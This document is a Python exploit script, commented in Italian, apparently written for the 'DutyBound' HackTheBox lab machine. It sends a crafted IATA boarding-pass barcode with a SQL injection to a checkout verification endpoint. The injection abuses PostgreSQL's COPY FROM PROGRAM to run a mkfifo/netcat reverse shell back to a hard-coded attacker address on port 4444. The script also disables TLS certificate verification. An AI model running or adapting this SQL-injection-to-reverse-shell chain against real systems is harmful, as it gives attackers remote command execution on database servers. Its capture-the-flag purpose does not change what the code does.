import requests
import argparse
import json
import urllib3
# libreria per simboli colorati
import avvisi

# disabilita messaggi di errore per SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# funzione per qcquisire i parametri dalla riga di comando
def AcquisisciArgomenti():
    parser=argparse.ArgumentParser(description="Exploit per la macchina DutyBound HTB")
    
    parser.add_argument("-u","--url",required=True,type=str,help="URL del target")
    parser.add_argument("-p","--port",type=int,default=80,help="porta del target")
    parser.add_argument("-e","--endpoint",default="/",type=str,help="endpoint del target")
    parser.add_argument("-x","--method",default="GET",type=str,help="metodo HTTP")
    # flag per avviare l'exploit ---> booleano
    parser.add_argument("--exploit",action="store_true",help="avviatore dell'exploit")
    # flag per formattare la risposta in JSON
    parser.add_argument("--json",action="store_true",help="flag per formattare la risposta json")
    # flag specifico per la SQL injection ---> disattivato, inserisco la query funzionante
    # parser.add_argument("-q","--query",type=str,help="query SQL")
    
    argomenti=parser.parse_args()
    return argomenti

# funzione per formattare la risposta in JSON
def FormattaJson(richiesta):
    try:
        richiesta_json=richiesta.json()
        richiesta_formattata=json.dumps(richiesta_json,indent=4,ensure_ascii=True)
        return richiesta_formattata
    except:
        return None

# funzione per l'exploit
def Exploit(url,query):
    carrello=f"{url}/cart/add"
    target=f"{url}/checkout/boarding-pass/verify"
    sessione=requests.Session()
    articolo = {
        "sku": "SNK-TWT-6"
    }
    # barcode standard IATA
    barcode_valido = f"M1DOE/JOHN            EABC123 LHRJFKBA 0123A275Y014C0042A1FF>50B0WW6275BBA 03125{query}"
    payload={
        "raw": barcode_valido
    }
    sessione.post(url=carrello,json=articolo,timeout=5,verify=False)
    exploit=sessione.post(url=target,json=payload,timeout=5,verify=False)
    return exploit

def main():

    argomenti=AcquisisciArgomenti()

    url=argomenti.url
    porta=argomenti.port
    endpoint=argomenti.endpoint
    metodo=argomenti.method.upper()
    exploit=argomenti.exploit
    flag_json=argomenti.json
    # query=argomenti.query
    query="'); CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.35 4444 >/tmp/f'; --"

    target=f"{url}:{porta}{endpoint}"

    try:
        print(f"{avvisi.informazione()} costruzione richiesta...")
        # controlla che il flag EXPLOIT sia presente nella riga di comando
        if exploit==True:
            # se presente ignora tutto il resto e attiva la funzione specifica per questa macchina
            url_exploit=f"{url}:{porta}"
            print(f"{avvisi.avvertimento()} ATTENZIONE! il flag EXPLOIT è attivo, parametri ENDPOINT e METHOD ignorati!")
            richiesta=Exploit(url=url_exploit,query=query)
        else:
            # se non presente procedi normalmente
            richiesta=requests.request(url=target,method=metodo,timeout=5,verify=False)
        
        if richiesta.status_code>=200 and richiesta.status_code<=299:
            print(f"{avvisi.successo()} richiesta accetata correttamente")    
        else:
            print(f"{avvisi.errore()} errore nella richiesta")
        
        print(f"{avvisi.informazione()} {metodo} verso {target}")
        print(f"{avvisi.informazione()} codice risposta: {richiesta.status_code}")
            
        if flag_json==True:
            risposta=FormattaJson(richiesta)
            if risposta is None:
                print(f"{avvisi.errore()} errore nella formattazione JSON")
            else:
                print(risposta)
        else:
            print(richiesta.text)
    except:
        print(f"{avvisi.errore()} ERRORE EXPLOIT")

if __name__=='__main__':
    main()